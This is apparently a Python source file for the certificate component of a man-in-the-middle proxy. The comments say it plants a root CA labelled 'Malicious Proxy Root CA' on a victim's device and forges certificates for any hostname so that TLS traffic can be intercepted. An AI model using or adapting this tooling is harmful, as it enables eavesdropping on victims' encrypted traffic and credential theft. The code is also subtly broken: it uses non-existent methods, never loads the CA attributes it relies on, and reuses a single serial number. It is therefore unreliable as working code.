import os
from OpenSSL import crypto

class CertManager:
    def __init__(self, ca_cert_path='ca.crt', ca_key_path='ca.key'):
        self.ca_cert_path = ca_cert_path
        self.ca_key_path = ca_key_path
        self.certs_dir = 'certs/'
        
        if not os.path.exists(self.certs_dir):
            os.makedirs(self.certs_dir)

    # Generate the Root CA on the victim's device
    def generate_ca(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)
        
        cert = crypto.X509()
        cert.set_serial_number(1000)
        cert.get_subject().CN = "Malicious Proxy Root CA"
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(key)
        cert.sign(key, 'sha256')
        
        with open(self.ca_cert_path, "wb") as f: f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(self.ca_key_path, "wb") as f: f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))

    # Generate a certificate for a specific hostname, signed by the CA
    def get_cert(self, hostname):
        cert_path = os.path.join(self.certs_dir, f"{hostname}.crt")
        key_path = os.path.join(self.certs_dir, f"{hostname}.key")

        if os.path.exists(cert_path):
            return cert_path, key_path

        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)

        cert = crypto.X509()
        cert.get_subject().CN = hostname 
        cert.set_serial_number(2000)     
        cert.gmtime_notBefore(0)         
        cert.gmtime_notAfter(31536000)   # Valid for 1 year
        cert.set_issuer(self.ca_cert.get_subject())
        cert.set_pubkey(key)

        cert.sign(self.ca_key, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))

        return cert_path, key_path